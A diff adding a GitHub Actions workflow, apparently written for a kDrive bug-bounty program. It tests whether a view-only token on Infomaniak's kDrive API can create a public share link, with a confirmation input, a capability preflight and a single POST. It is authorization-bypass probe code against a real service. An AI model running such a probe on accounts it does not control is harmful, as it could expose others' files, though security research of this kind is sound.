@@ -1,0 +1,122 @@
+name: kDrive view-only public-link authorization probe
+
+on:
+  workflow_dispatch:
+    inputs:
+      drive_id:
+        description: "Controlled kDrive numeric ID"
+        required: true
+        type: string
+      node_id:
+        description: "Controlled canary file/folder node ID with no existing public link"
+        required: true
+        type: string
+      confirm_controlled_node:
+        description: "Type I_CONTROL_THIS_NODE to enable the single POST"
+        required: true
+        type: string
+
+permissions:
+  contents: read
+
+jobs:
+  authz-probe:
+    runs-on: ubuntu-latest
+    env:
+      KDRIVE_VIEW_TOKEN: ${{ secrets.KDRIVE_VIEW_TOKEN }}
+      DRIVE_ID: ${{ inputs.drive_id }}
+      NODE_ID: ${{ inputs.node_id }}
+      CONFIRM_CONTROLLED_NODE: ${{ inputs.confirm_controlled_node }}
+    steps:
+      - name: Verify view-only capability boundary, then issue one public-link POST
+        shell: python
+        run: |
+          import json
+          import os
+          import sys
+          import requests
+
+          token = os.environ.get("KDRIVE_VIEW_TOKEN", "")
+          drive_id = os.environ.get("DRIVE_ID", "").strip()
+          node_id = os.environ.get("NODE_ID", "").strip()
+          confirmation = os.environ.get("CONFIRM_CONTROLLED_NODE", "")
+
+          if not token:
+              print("[STOP] missing KDRIVE_VIEW_TOKEN")
+              sys.exit(2)
+          print(f"::add-mask::{token}")
+
+          if confirmation != "I_CONTROL_THIS_NODE":
+              print("[STOP] controlled-node confirmation did not match")
+              sys.exit(3)
+          if not drive_id.isdigit() or not node_id:
+              print("[STOP] invalid drive_id/node_id input")
+              sys.exit(4)
+
+          ua = "kDrive-YWH-view-authz/1.0 Infomaniak-YWH-Bugbounty"
+          headers = {
+              "Authorization": f"Bearer {token}",
+              "User-Agent": ua,
+              "Accept": "application/json",
+          }
+
+          # Fail closed: first prove that this exact controlled node is visible to
+          # the low-privilege principal while sharing/writing are explicitly denied.
+          meta_url = f"https://api.kdrive.infomaniak.com/3/drive/{drive_id}/files/{node_id}"
+          meta = requests.get(meta_url, headers=headers, params={"with": "capabilities,sharelink"}, timeout=30)
+          print(f"[PREFLIGHT] HTTP={meta.status_code}")
+          try:
+              obj = meta.json()
+          except Exception:
+              print("[STOP] metadata response was not JSON")
+              sys.exit(5)
+
+          if meta.status_code != 200 or obj.get("result") != "success":
+              err = obj.get("error") or {}
+              print(f"[STOP] metadata failed code={err.get('code')} reason={err.get('reason')}")
+              sys.exit(6)
+
+          data = obj.get("data") or {}
+          caps = data.get("capabilities") or {}
+          can_share = caps.get("can_share")
+          can_write = caps.get("can_write")
+          print(f"[CAPS] can_share={can_share!r} can_write={can_write!r}")
+
+          # Require explicit booleans. Missing capability fields are inconclusive,
+          # not permission to proceed.
+          if can_share is not False or can_write is not False:
+              print("[STOP] exact node is not explicitly view-only (need can_share=false and can_write=false)")
+              sys.exit(0)
+
+          existing = data.get("sharelink")
+          if existing:
+              print("[STOP] node already has a public link; choose a fresh controlled canary")
+              sys.exit(0)
+
+          # Match the released desktop client's PostFileLinkJob exactly:
+          # API version 2, POST /drive/{drive}/files/{node}/link?right=public.
+          post_url = f"https://api.kdrive.infomaniak.com/2/drive/{drive_id}/files/{node_id}/link"
+          resp = requests.post(post_url, headers=headers, params={"right": "public"}, timeout=30)
+
+          try:
+              out = resp.json()
+          except Exception:
+              print(f"[RESULT] HTTP={resp.status_code} non_json=true")
+              sys.exit(0)
+
+          # Never print the returned public URL/token. Only emit status and error metadata.
+          err = out.get("error") or {}
+          result = out.get("result")
+          print(f"[RESULT] HTTP={resp.status_code} result={result!r} code={err.get('code')!r} reason={err.get('reason')!r}")
+
+          if 200 <= resp.status_code < 300 and result == "success":
+              print("[SECURITY_SIGNAL] VIEW_ONLY_PRINCIPAL_CREATED_PUBLIC_LINK=true")
+              print("[ACTION] Revoke the canary public link from the owner account immediately after preserving minimal evidence.")
+          elif resp.status_code in (401, 403):
+              print("[SECURITY_SIGNAL] BACKEND_AUTHORIZATION_ENFORCED=true")
+          else:
+              blob = json.dumps(out, separators=(",", ":")).lower()
+              if "already" in blob and "link" in blob:
+                  print("[SECURITY_SIGNAL] INCONCLUSIVE_EXISTING_LINK=true")
+              else:
+                  print("[SECURITY_SIGNAL] INCONCLUSIVE=true")
